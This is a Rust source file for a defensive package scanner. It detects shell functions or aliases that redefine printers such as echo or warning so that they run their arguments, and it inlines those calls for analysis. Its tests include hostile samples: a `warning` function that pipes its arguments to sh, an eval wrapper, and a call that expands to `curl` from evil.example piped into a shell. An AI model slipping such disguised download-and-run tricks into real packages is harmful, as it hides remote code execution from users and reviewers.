//! Redefined message printers.
//!
//! `echo`, `printf`, `msg`, `note`, `warning` ... are treated as inert text by
//! the rule engine's inert-line classification: a line that only prints cannot run anything.
//! That only holds while those names mean what they say. Shell functions and
//! aliases shadow builtins and commands, so a package that defines
//! `warning() { "$@" | sh; }` turns every `warning ...` line into code.
//!
//! This module finds such definitions anywhere in a package (PKGBUILD, install
//! scriptlets, sidecars), decides whether a definition is a harmless wrapper
//! around a real print or something that runs its arguments, and inlines calls
//! to the dangerous ones so the ordinary detectors see the command that will
//! really run. Static only: nothing is executed or sourced.

use crate::textutil::{
    logical_lines, normalize_shell_quoting, split_statements, split_words, SHELLS,
};
use lazy_static::lazy_static;
use regex::Regex;
use std::collections::HashSet;
use std::path::{Path, PathBuf};

/// Command names that `informational_lines` treats as printing text.
pub(crate) const PRINTERS: &[&str] = &[
    "echo", "printf", "print", "note", "msg", "msg2", "warning", "plain", "error",
];

/// Printers plus `cat`, which the heredoc rule also trusts.
const CHECKED: &str = "echo|printf|print|note|msg|msg2|warning|plain|error|cat";

lazy_static! {
    /// `name() {`, `name () (`, optionally prefixed by `function`.
    static ref FN_PARENS: Regex = Regex::new(&format!(
        r"(?m)(?:^|[;&|(){{}}\s])(?:function\s+)?({CHECKED})\s*\(\s*\)\s*([{{(])"
    ))
    .unwrap();
    /// `function name {` (no parentheses).
    static ref FN_KEYWORD: Regex = Regex::new(&format!(
        r"(?m)(?:^|[;&|(){{}}\s])function\s+({CHECKED})\s*()\{{"
    ))
    .unwrap();
    /// `alias name=value`.
    static ref ALIAS: Regex = Regex::new(&format!(
        r#"(?m)(?:^|[;&|(){{}}\s])alias\s+(?:-\w+\s+)*({CHECKED})=(?:'([^']*)'|"([^"]*)"|(\S*))"#
    ))
    .unwrap();
    /// `enable -n echo` / `enable -n` (turns a builtin off so a same-named
    /// script or function wins), and `enable` aimed at a printer name.
    static ref ENABLE_OVERRIDE: Regex = Regex::new(&format!(
        r"(?m)(?:^|[;&|(){{}}\s])enable\s+(?:-\w*[nf]\w*\b|(?:-\w+\s+)*(?:{CHECKED})\b)"
    ))
    .unwrap();
    /// Functions or aliases that redefine the commands used to reach a builtin
    /// (`builtin() {..}`, `alias command=..`), which can re-route any printer.
    static ref LOOKUP_OVERRIDE: Regex = Regex::new(
        r"(?m)(?:^|[;&|(){}\s])(?:(?:function\s+)?(?:builtin|command|enable|unalias|unset|hash|type)\s*\(\s*\)|function\s+(?:builtin|command|enable|unalias|unset|hash|type)\b|alias\s+(?:-\w+\s+)*(?:builtin|command|enable|unalias|unset|hash|type)=)"
    )
    .unwrap();
    /// Any definition of a printer name in any syntax: `name()`, `name ()`,
    /// `name` then newlines/comments then `(`, or `function name`. Deliberately
    /// broad: a false trigger only turns the message exemption off.
    static ref ANY_PRINTER_DEF: Regex = Regex::new(
        r"(?m)(?:^|[;&|(){}$\s])(?:function\s+(?:echo|printf|msg2?|plain|warning|error|note)\b|(?:echo|printf|msg2?|plain|warning|error|note)(?:[ \t]|#[^\n]*|\n)*\()"
    )
    .unwrap();
    /// Command-position `alias` / `enable`, DEBUG/RETURN/ERR traps, `extdebug`,
    /// `functrace`, `set -T`, `BASH_ENV`: each can re-route a print.
    static ref MESSAGE_BLOCKERS: Regex = Regex::new(
        r"\b(?:alias|unalias|shopt|expand_aliases|BASH_ALIASES|BASH_CMDS|command_not_found_handle|trap|eval|BASH_ENV|ENV|PROMPT_COMMAND|extdebug|functrace)\b|\b(?:declare|typeset)\s+-[A-Za-z]*f|\bset\s+-[A-Za-z]*T"
    )
    .unwrap();
    static ref SOURCE_WORD: Regex = Regex::new(r"\bsource\b").unwrap();
    /// `. file` (a lone dot followed by blanks and a word).
    static ref DOT_WORD: Regex = Regex::new(r"(?:^|[\s;&|({])\.[ \t]+\S").unwrap();
    static ref ENABLE_WORD: Regex = Regex::new(r"\benable\b").unwrap();
    static ref POSITIONAL: Regex =
        Regex::new(r#"\$(?:[@*1-9]|\{[@*1-9])"#).unwrap();
    static ref SHELL_DASH_C: Regex = Regex::new(&format!(
        r"(?i)\b{SHELLS}\s+(?:-\S+\s+)*-\w*c\b"
    ))
    .unwrap();
    static ref PIPE_TO_SHELL: Regex = Regex::new(&format!(
        r"\|\s*(?:(?:sudo|env|exec|command)\s+)*(?:\S*/)?{SHELLS}\b"
    ))
    .unwrap();
    static ref EVAL: Regex = Regex::new(r"(?:^|[\s;&|(])eval\b").unwrap();
    static ref SUBST: Regex =
        Regex::new(r#""?\$(?:\{([@*]|[0-9])\}|([@*]|[0-9]))"?"#).unwrap();
}

/// One function or alias that shadows a printer name.
#[derive(Debug, Clone)]
pub struct ShadowDef {
    /// The shadowed name (`warning`).
    pub name: String,
    /// Function body (between the braces) or alias value.
    pub body: String,
    /// Defined with `alias` rather than as a function.
    pub alias: bool,
    /// File the definition was found in.
    pub file: PathBuf,
    /// 1-based line of the definition.
    pub line: usize,
}

/// Every shadowing definition found across a package.
#[derive(Debug, Clone, Default)]
pub struct ShadowSet {
    /// All definitions, in discovery order.
    pub defs: Vec<ShadowDef>,
    /// Some file turns a builtin off (`enable -n`) or redefines `builtin`/
    /// `command`/...: any printer name may now run code.
    pub overrides: bool,
    /// Something in the package can re-route a printer (any printer definition,
    /// alias, `enable`, DEBUG/RETURN/ERR trap, `extdebug`, `functrace`,
    /// `set -T`, `BASH_ENV`): the one-line message exemption is off.
    pub blocked: bool,
    /// [`ShadowSet::names`], computed once.
    names_cache: std::sync::OnceLock<HashSet<String>>,
    /// Whether any definition is not provably a plain print, computed once.
    untrusted_cache: std::sync::OnceLock<bool>,
}

/// Sentinel member of [`ShadowSet::names`] meaning "the message exemption is
/// off for this package".
pub(crate) const EXEMPTION_BLOCKED: &str = "\u{0}message-exemption-blocked";

fn closing(open: char) -> char {
    if open == '(' {
        ')'
    } else {
        '}'
    }
}

/// The text between the group opened at `open_idx` and its matching closer.
/// Quote- and escape-aware; an unterminated group runs to the end of the text.
fn group_body(text: &str, open_idx: usize) -> String {
    /// A definition body longer than this is cut (and then never provably a
    /// plain print), so scanning stays linear on hostile input.
    const MAX_BODY: usize = 64 * 1024;
    let mut it = text[open_idx..].char_indices();
    let open = it.next().map_or('{', |(_, c)| c);
    let close = closing(open);
    let (mut depth, mut sq, mut dq) = (1i32, false, false);
    while let Some((i, c)) = it.next() {
        if i > MAX_BODY {
            return text[open_idx + 1..open_idx + i].to_string();
        }
        if sq {
            sq = c != '\'';
        } else if c == '\\' {
            it.next();
        } else if dq {
            dq = c != '"';
        } else if c == '\'' {
            sq = true;
        } else if c == '"' {
            dq = true;
        } else if c == open {
            depth += 1;
        } else if c == close {
            depth -= 1;
            if depth == 0 {
                return text[open_idx + 1..open_idx + i].to_string();
            }
        }
    }
    text[open_idx + 1..].to_string()
}

/// Words that may precede a command without being the command.
const COMMAND_PREFIX: &[&str] = &[
    "then", "do", "else", "elif", "if", "while", "until", "!", "builtin", "command", "exec", "env",
    "time", "nohup", "sudo",
];

/// Whether the match starting at `start` is at command position: after nothing,
/// a separator, or only keywords/wrappers such as `then`, `builtin`, `command`.
fn at_command_position(flat: &str, start: usize) -> bool {
    let seg = flat[..start]
        .rsplit([';', '&', '|', '(', ')', '{', '}', '`', '\n'])
        .next()
        .unwrap_or("");
    seg.split_whitespace().all(|w| COMMAND_PREFIX.contains(&w))
}

/// Any `enable` that can be the builtin. `systemctl enable` and prose like "To
/// enable the service" are not.
fn enable_command_word(flat: &str) -> bool {
    ENABLE_WORD
        .find_iter(flat)
        .any(|m| at_command_position(flat, m.start()))
}

/// `source <word>` or `. <word>` as a command. Never the PKGBUILD `source=`,
/// `source+=` or `source_<arch>=` arrays (the `\b` also keeps `source_x86_64`
/// out), and never prose in the middle of a message.
fn source_command_word(flat: &str) -> bool {
    SOURCE_WORD.find_iter(flat).any(|m| {
        let t = flat[m.end()..].trim_start_matches([' ', '\t']);
        !(t.starts_with('=') || t.starts_with("+=")) && at_command_position(flat, m.start())
    }) || DOT_WORD.find_iter(flat).any(|m| {
        let dot = m.start() + m.as_str().find('.').unwrap_or(0);
        at_command_position(flat, dot)
    })
}

/// 1-based line of byte `idx`, given the sorted offsets of every `\n`.
fn line_of(newlines: &[usize], idx: usize) -> usize {
    newlines.partition_point(|&n| n < idx) + 1
}

impl ShadowSet {
    /// Find definitions in several files at once.
    pub fn from_texts<'a>(texts: impl IntoIterator<Item = (&'a Path, &'a str)>) -> Self {
        let mut set = ShadowSet::default();
        for (path, text) in texts {
            set.add_text(path, text);
        }
        set
    }

    /// Definitions in one text (no file context needed).
    pub fn from_text(text: &str) -> Self {
        Self::from_texts([(Path::new(""), text)])
    }

    fn add_text(&mut self, path: &Path, text: &str) {
        // Search a copy with quotes, backslashes and line continuations removed,
        // so `ms\<nl>g() {..}`, `m""sg() {..}` and `'msg'()` read as `msg()`.
        let flat: String = text
            .replace("\\\n", "")
            .chars()
            .filter(|c| !matches!(c, '\'' | '"' | '\\'))
            .collect();
        if ANY_PRINTER_DEF.is_match(&flat)
            || MESSAGE_BLOCKERS.is_match(&flat)
            || source_command_word(&flat)
            || enable_command_word(&flat)
        {
            self.blocked = true;
        }
        if text.contains("enable") || text.contains("builtin") || text.contains("command") {
            if ENABLE_OVERRIDE.is_match(text) || LOOKUP_OVERRIDE.is_match(text) {
                self.overrides = true;
            }
        } else if text.contains("alias") && LOOKUP_OVERRIDE.is_match(text) {
            self.overrides = true;
        }
        // Cheap precheck: no printer name, no definition.
        if !PRINTERS.iter().chain(&["cat"]).any(|n| text.contains(n)) {
            return;
        }
        let newlines: Vec<usize> = text
            .bytes()
            .enumerate()
            .filter_map(|(i, b)| (b == b'\n').then_some(i))
            .collect();
        for caps in FN_PARENS.captures_iter(text) {
            let (name, open) = (caps.get(1).unwrap(), caps.get(2).unwrap());
            self.defs.push(ShadowDef {
                name: name.as_str().to_string(),
                body: group_body(text, open.start()),
                alias: false,
                file: path.to_path_buf(),
                line: line_of(&newlines, name.start()),
            });
        }
        for caps in FN_KEYWORD.captures_iter(text) {
            let name = caps.get(1).unwrap();
            let open = text[name.end()..].find('{').map(|k| name.end() + k);
            if let Some(open) = open {
                self.defs.push(ShadowDef {
                    name: name.as_str().to_string(),
                    body: group_body(text, open),
                    alias: false,
                    file: path.to_path_buf(),
                    line: line_of(&newlines, name.start()),
                });
            }
        }
        for caps in ALIAS.captures_iter(text) {
            let name = caps.get(1).unwrap();
            let val = caps
                .get(2)
                .or_else(|| caps.get(3))
                .or_else(|| caps.get(4))
                .map(|m| m.as_str())
                .unwrap_or("");
            self.defs.push(ShadowDef {
                name: name.as_str().to_string(),
                body: val.to_string(),
                alias: true,
                file: path.to_path_buf(),
                line: line_of(&newlines, name.start()),
            });
        }
    }

    /// Names that must no longer be trusted as inert printers.
    ///
    /// A redefinition that only wraps a real print (`msg() { echo "==> $1"; }`)
    /// keeps the name inert, because nothing it can do differs from the printer
    /// it replaces. Anything else, including a body this module cannot show to
    /// be a plain print, un-trusts the name for the whole package.
    ///
    /// One untrusted redefinition (or a builtin override such as `enable -n`)
    /// un-trusts EVERY printer name in the package, not just its own: a harmless
    /// looking `msg() { echo "$1"; }` is code the moment `echo` can run its
    /// arguments, and `msg "curl .."` / `msg "sh .."` then execute with no
    /// operator on either line. The whole package falls back to full scanning.
    pub fn names(&self) -> HashSet<String> {
        self.names_ref().clone()
    }

    /// [`Self::names`] computed once per set (call after every file is added).
    pub fn names_ref(&self) -> &HashSet<String> {
        self.names_cache.get_or_init(|| self.compute_names())
    }

    fn compute_names(&self) -> HashSet<String> {
        // Identical bodies (a flood of `msg() { echo "$1"; }`) are judged once.
        let mut verdict: std::collections::HashMap<(&str, bool), bool> = Default::default();
        let mut names: HashSet<String> = HashSet::new();
        for d in &self.defs {
            let benign = *verdict
                .entry((d.body.as_str(), d.alias))
                .or_insert_with(|| is_benign(d));
            if !benign {
                names.insert(d.name.clone());
            }
        }
        if self.overrides || !names.is_empty() {
            names.extend(PRINTERS.iter().chain(&["cat"]).map(|n| n.to_string()));
        }
        if self.blocked || self.overrides || !self.defs.is_empty() || !names.is_empty() {
            names.insert(EXEMPTION_BLOCKED.to_string());
        }
        names
    }

    /// Definitions whose body runs its arguments.
    pub fn executing(&self) -> impl Iterator<Item = &ShadowDef> {
        self.defs.iter().filter(|d| executes_args(d))
    }

    /// No definitions found.
    pub fn is_empty(&self) -> bool {
        self.defs.is_empty()
    }

    /// `text` with each call to an untrusted redefined printer replaced by the
    /// definition's body (arguments substituted), so detectors see the command
    /// that really runs. Line numbers are preserved. `None` when no call was
    /// inlined.
    pub fn inline_calls(&self, text: &str) -> Option<String> {
        // Only a definition that is not a plain print makes a call worth inlining
        // (a benign-only package keeps the cheap early return).
        if !*self
            .untrusted_cache
            .get_or_init(|| self.defs.iter().any(|d| !is_benign(d)))
        {
            return None;
        }
        let names = self.names_ref();
        if names.is_empty() {
            return None;
        }
        let total = text.lines().count();
        let mut out = vec![String::new(); total.max(1)];
        let mut changed = false;
        for (start, line) in logical_lines(text) {
            let rebuilt = self.inline_line(&line, names);
            if rebuilt.is_some() {
                changed = true;
            }
            if let Some(slot) = out.get_mut(start.saturating_sub(1)) {
                *slot = rebuilt.unwrap_or(line);
            }
        }
        changed.then(|| out.join("\n"))
    }

    fn inline_line(&self, line: &str, names: &HashSet<String>) -> Option<String> {
        if line.trim_start().starts_with('#') {
            return None;
        }
        let mut rebuilt = String::new();
        let mut changed = false;
        for (stmt, sep) in split_statements(line) {
            match self.inline_stmt(&stmt, names) {
                Some(s) => {
                    changed = true;
                    rebuilt.push_str(&s);
                }
                None => rebuilt.push_str(&stmt),
            }
            rebuilt.push_str(&sep);
        }
        changed.then_some(rebuilt)
    }

    fn inline_stmt(&self, stmt: &str, names: &HashSet<String>) -> Option<String> {
        const KEYWORDS: &[&str] = &[
            "then", "do", "else", "if", "elif", "while", "until", "!", "{", "(",
        ];
        let words = split_words(stmt.trim_start());
        // A one-line function (`prepare() { plain curl ...; }`) puts the call after
        // its own header.
        let idx = words
            .iter()
            .position(|w| !KEYWORDS.contains(&w.as_str()) && !w.ends_with("()"))?;
        let name = normalize_shell_quoting(&words[idx]);
        if !names.contains(&name) {
            return None;
        }
        // `name () {` is the definition, not a call.
        if words.get(idx + 1).is_some_and(|w| w.starts_with('(')) {
            return None;
        }
        // Arguments run up to the first redirection or pipe.
        let rest = &words[idx + 1..];
        let cut = rest
            .iter()
            .position(|w| {
                w.starts_with(['|', '>', '<']) || w.starts_with("&>") || is_fd_redirect(w)
            })
            .unwrap_or(rest.len());
        let (args, tail) = rest.split_at(cut);
        // Prefer a definition that executes its arguments.
        let def = self
            .defs
            .iter()
            .filter(|d| d.name == name && !is_benign(d))
            .max_by_key(|d| executes_args(d))?;
        let mut s = words[..idx].join(" ");
        if !s.is_empty() {
            s.push(' ');
        }
        s.push_str(&expand(def, args));
        for w in tail {
            s.push(' ');
            s.push_str(w);
        }
        Some(s)
    }
}

fn is_fd_redirect(w: &str) -> bool {
    let digits = w.chars().take_while(char::is_ascii_digit).count();
    digits > 0 && w[digits..].starts_with(['>', '<'])
}

/// Body statements joined into one line (a call site is one line, and line
/// numbers must not move).
fn flatten_body(body: &str) -> String {
    let mut out = String::new();
    for l in body.lines() {
        let l = l.trim();
        if l.is_empty() || l.starts_with('#') {
            continue;
        }
        if !out.is_empty() {
            let joiner = if out.ends_with(['|', '&', '{', '('])
                || out.ends_with("then")
                || out.ends_with("do")
            {
                " "
            } else {
                "; "
            };
            out.push_str(joiner);
        }
        out.push_str(l.trim_end_matches(';'));
    }
    out
}

fn expand(def: &ShadowDef, args: &[String]) -> String {
    if def.alias {
        let mut s = def.body.trim().to_string();
        for a in args {
            s.push(' ');
            s.push_str(a);
        }
        return s;
    }
    let body = flatten_body(&def.body);
    SUBST
        .replace_all(&body, |c: &regex::Captures| {
            let which = c
                .get(1)
                .or_else(|| c.get(2))
                .map(|m| m.as_str())
                .unwrap_or("");
            match which {
                "@" | "*" => args.join(" "),
                "0" => String::new(),
                d => d
                    .parse::<usize>()
                    .ok()
                    .and_then(|n| args.get(n - 1))
                    .cloned()
                    .unwrap_or_default(),
            }
        })
        .into_owned()
}

/// Words that may legitimately make up a print wrapper.
const BENIGN_WORDS: &[&str] = &[
    "echo", "printf", "true", ":", "return", "exit", "local", "shift", "[", "[[", "test", "fi",
    "done", "esac", "else", "then", "do", "if", "elif", "while", "for", "case", "}", "{",
];

/// Redirections that only send a message to stderr or discard it.
const SAFE_REDIRECTS: &[&str] = &[
    "1>&2",
    "2>&1",
    ">&2",
    "&>/dev/null",
    "2>/dev/null",
    ">/dev/null",
    "1>/dev/null",
    ">/dev/stderr",
    "1>/dev/stderr",
];

/// Whether the definition can do nothing a plain print could not.
fn is_benign(def: &ShadowDef) -> bool {
    if def.alias {
        let first = def.body.split_whitespace().next().unwrap_or("-");
        return matches!(first, "echo" | "printf" | "true" | ":")
            && !super::has_executable_operator(&def.body);
    }
    for raw in def.body.lines() {
        let l = raw.trim();
        if l.is_empty() || l.starts_with('#') {
            continue;
        }
        for (stmt, _) in split_statements(l) {
            let mut words = split_words(stmt.trim());
            words.retain(|w| !SAFE_REDIRECTS.contains(&w.as_str()));
            if words.is_empty() {
                continue;
            }
            let joined = words.join(" ");
            if super::has_executable_operator(&joined) {
                return false;
            }
            // `a=$1` assignments are plain data.
            let first = normalize_shell_quoting(&words[0]);
            let is_assign = first.split_once('=').is_some_and(|(k, _)| {
                !k.is_empty() && k.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
            });
            if !is_assign && !BENIGN_WORDS.contains(&first.as_str()) {
                return false;
            }
        }
    }
    true
}

/// Whether the body runs the arguments it is given.
fn executes_args(def: &ShadowDef) -> bool {
    if def.alias {
        return !is_benign(def);
    }
    let body: String = def
        .body
        .lines()
        .filter(|l| !l.trim_start().starts_with('#'))
        .collect::<Vec<_>>()
        .join("\n");
    if !POSITIONAL.is_match(&body) {
        return false;
    }
    if EVAL.is_match(&body) || SHELL_DASH_C.is_match(&body) || PIPE_TO_SHELL.is_match(&body) {
        return true;
    }
    // A positional parameter in command position: `"$@"`, `$1 ...`, or behind a
    // launcher (`exec "$@"`, `env "$@"`, `command "$1"`).
    const LAUNCHERS: &[&str] = &[
        "command", "exec", "env", "builtin", "nohup", "time", "sudo", "setsid", "nice", "xargs",
        "source", ".", "stdbuf", "timeout",
    ];
    for l in body.lines() {
        for (stmt, _) in split_statements(l) {
            for part in stmt.split('|') {
                let words = split_words(part.trim());
                let first = words.iter().find(|w| {
                    let n = normalize_shell_quoting(w);
                    !(LAUNCHERS.contains(&n.as_str())
                        || n.starts_with('-')
                        || n == "{"
                        || n == "then"
                        || n == "do")
                });
                if first.is_some_and(|w| POSITIONAL.is_match(w) && !w.starts_with('\'')) {
                    return true;
                }
            }
        }
    }
    false
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn finds_function_alias_and_keyword_forms() {
        let t =
            "warning() { \"$@\" | sh; }\nfunction note {\n  eval \"$1\"\n}\nalias plain='sh -c'\n";
        let s = ShadowSet::from_text(t);
        let names = s.names();
        for n in ["warning", "note", "plain"] {
            assert!(names.contains(n), "{n}: {names:?}");
        }
        assert_eq!(s.executing().count(), 3);
    }

    #[test]
    fn benign_wrappers_stay_inert() {
        let t =
            "msg() { echo \"==> $1\" >&2; }\nerror() {\n  printf '%s\\n' \"$@\"\n  return 1\n}\n";
        let s = ShadowSet::from_text(t);
        // No printer name is untrusted; only the message exemption is off (any
        // printer definition turns it off).
        let names = s.names();
        assert!(names.iter().all(|n| n == EXEMPTION_BLOCKED), "{names:?}");
        assert!(names.contains(EXEMPTION_BLOCKED));
        assert_eq!(s.executing().count(), 0);
    }

    #[test]
    fn inlines_calls_with_arguments() {
        let s = ShadowSet::from_text("warning() { \"$@\" | sh; }\n");
        let t = "post_install() {\n  warning curl -s https://evil.example/x\n}\n";
        let inl = s.inline_calls(t).unwrap();
        assert!(inl.contains("curl -s https://evil.example/x | sh"), "{inl}");
        assert_eq!(inl.lines().count(), t.lines().count());
    }
}
